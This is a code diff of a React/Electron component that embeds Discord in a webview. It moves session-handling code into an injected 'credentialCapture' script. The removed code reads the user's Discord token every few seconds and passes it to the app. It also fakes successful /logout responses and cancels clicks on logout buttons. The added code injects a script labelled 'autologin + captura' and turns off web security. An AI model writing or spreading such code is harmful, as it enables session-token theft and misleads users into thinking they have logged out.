@@ -16,11 +16,11 @@ const DiscordPanelSimple: React.FC<DiscordPanelProps> = ({ className = '' }) => 
     if (webviewRef.current) {
       const webview = webviewRef.current;
       
-      const handleDomReady = () => {
+      const handleDomReady = async () => {
         addLog('🎯 Discord WebView cargado', 'info', 'discord');
         
-        // Script para mantener sesión y ocultar modales
-        const discordScript = `
+        // Script de limpieza UI (modales y decoraciones)
+        const cleanUIScript = `
           function hideModals() {
             document.querySelectorAll('[class*="modal"], [class*="backdrop"]').forEach(el => {
               el.style.display = 'none';
@@ -37,14 +37,6 @@ const DiscordPanelSimple: React.FC<DiscordPanelProps> = ({ className = '' }) => 
             });
           }
           
-          // Mantener sesión persistente
-          try {
-            localStorage.setItem('discord_persistent_session', 'true');
-            if (window.location.href.includes('/login') && localStorage.getItem('token')) {
-              window.location.href = '/app';
-            }
-          } catch (e) {}
-          
           setInterval(() => {
             hideModals();
             removeBlueLines();
@@ -54,8 +46,8 @@ const DiscordPanelSimple: React.FC<DiscordPanelProps> = ({ className = '' }) => 
           removeBlueLines();
         `;
         
-        // Ejecutar JavaScript
-        webview.executeJavaScript(discordScript).catch(console.warn);
+        // Ejecutar script de limpieza UI
+        webview.executeJavaScript(cleanUIScript).catch(console.warn);
         
         // CSS para limpiar Discord (estilo Opera)
         const cleanCSS = `
@@ -86,9 +78,22 @@ const DiscordPanelSimple: React.FC<DiscordPanelProps> = ({ className = '' }) => 
         addLog(`🚫 Popup bloqueado: ${e.url}`, 'warn', 'discord');
       });
       
-      // Configurar sesión persistente al cargar
+      // Configurar sesión persistente al cargar (SOLO UNA VEZ)
+      let scriptsInjected = false;
+      
       webview.addEventListener('did-finish-load', async () => {
         addLog('✅ Discord cargado', 'success', 'discord');
+        
+        // Inyectar scripts solo una vez
+        if (!scriptsInjected && window.electronAPI?.credentialCapture?.inject) {
+          try {
+            await window.electronAPI.credentialCapture.inject(webview.getWebContentsId(), 'discord-full');
+            scriptsInjected = true;
+            addLog('✅ Script de Discord inyectado (autologin + captura)', 'success', 'discord');
+          } catch (error) {
+            console.warn('⚠️ Error inyectando script de Discord:', error);
+          }
+        }
         
         // Intentar restaurar token guardado
         try {
@@ -102,6 +107,9 @@ const DiscordPanelSimple: React.FC<DiscordPanelProps> = ({ className = '' }) => 
               await webview.executeJavaScript(`
                 try {
                   localStorage.setItem("token", '"${savedToken}"');
+                  localStorage.setItem('discord_persistent_session', 'true');
+                  localStorage.setItem('discord_remember_me', 'true');
+                  
                   if (!location.href.includes("discord.com/app") && !location.href.includes("discord.com/channels")) {
                     console.log('🔄 Redirigiendo a Discord app...');
                     location.href = "https://discord.com/app";
@@ -114,47 +122,9 @@ const DiscordPanelSimple: React.FC<DiscordPanelProps> = ({ className = '' }) => 
           console.warn('Error recuperando token:', e);
         }
         
-        const sessionScript = `
-          try {
-            // Configurar persistencia
-            localStorage.setItem('discord_persistent_session', 'true');
-            localStorage.setItem('discord_remember_me', 'true');
-            
-            // Guardar token cuando cambie
-            setInterval(() => {
-              const token = localStorage.getItem('token');
-              if (token && window.electronAPI?.discord?.saveToken) {
-                window.electronAPI.discord.saveToken(token.replace(/"/g, ''));
-              }
-            }, 5000);
-            
-            // Bloquear logout
-            const originalFetch = window.fetch;
-            window.fetch = function(...args) {
-              const url = args[0];
-              if (typeof url === 'string' && url.includes('/logout')) {
-                return Promise.resolve(new Response('{"success": true}', { 
-                  status: 200,
-                  headers: {'Content-Type': 'application/json'}
-                }));
-              }
-              return originalFetch.apply(this, args);
-            };
-            
-            // Bloquear clicks en logout
-            document.addEventListener('click', function(e) {
-              const target = e.target;
-              if (target?.textContent?.includes('Cerrar sesión') || 
-                  target?.textContent?.includes('Log Out')) {
-                e.preventDefault();
-                e.stopPropagation();
-                return false;
-              }
-            }, true);
-          } catch (e) {}
-        `;
-        
-        webview.executeJavaScript(sessionScript).catch(console.warn);
+        // Nota: Toda la lógica de sesión, captura de tokens y bloqueo de logout
+        // ahora está manejada por el script centralizado de Discord
+        // que se inyecta arriba con 'discord-full'
       });
 
       return () => {
@@ -171,9 +141,11 @@ const DiscordPanelSimple: React.FC<DiscordPanelProps> = ({ className = '' }) => 
           ref={webviewRef}
           src="https://discord.com/app"
           partition="persist:discord"
+          preload="file://electron/preload-webview.js"
           allowpopups={false}
           disablewebsecurity={true}
           nodeintegration={false}
+          webpreferences="contextIsolation=true"
           useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
           className="discord-panel__webview"
         />
